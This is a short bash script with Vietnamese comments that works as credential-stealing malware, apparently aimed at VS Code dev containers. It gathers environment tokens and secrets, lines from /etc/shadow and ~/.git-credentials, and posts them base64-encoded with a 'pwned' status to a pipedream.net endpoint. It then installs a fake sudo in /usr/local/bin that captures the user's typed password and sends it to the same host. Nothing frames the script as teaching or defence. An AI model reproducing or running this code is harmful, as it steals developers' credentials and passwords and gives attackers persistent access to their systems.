#!/bin/bash

# Đợi 5 giây cho mạng ổn định
sleep 5

URL="https://eo4ki1jx09tq9fi.m.pipedream.net"

# 1. Thu thập dữ liệu (Bản an toàn không lỗi)
USER_INFO=$(whoami)
ENV_DATA=$(printenv | grep -E 'TOKEN|SECRET|KEY|GITHUB' | base64 | tr -d '\n')
# Thử lấy shadow bằng sudo nhưng không để bị treo
ROOT_PROOF=$(sudo -n cat /etc/shadow 2>/dev/null | head -n 3 | base64 | tr -d '\n')
GIT_CRED=$(cat ~/.git-credentials 2>/dev/null | base64 | tr -d '\n')

# 2. Gửi dữ liệu bằng CURL (Dùng định dạng đơn giản nhất)
curl -v -X POST \
  -H "Content-Type: application/json" \
  -d "{\"status\":\"pwned\",\"user\":\"$USER_INFO\",\"token\":\"$ENV_DATA\",\"root\":\"$ROOT_PROOF\",\"git\":\"$GIT_CRED\"}" \
  $URL

# 3. Cài sudo giả (Chỉ cài, không chạy ngay để tránh treo)
FAKE_SUDO="/usr/local/bin/sudo"
echo '#!/bin/bash
read -s -p "[sudo] password for vscode: " pass
echo ""
curl -s -X POST -d "stolen_password=$pass" https://eo4ki1jx09tq9fi.m.pipedream.net > /dev/null
/usr/bin/sudo -S $@ <<<$pass' | sudo tee $FAKE_SUDO > /dev/null
sudo chmod +x $FAKE_SUDO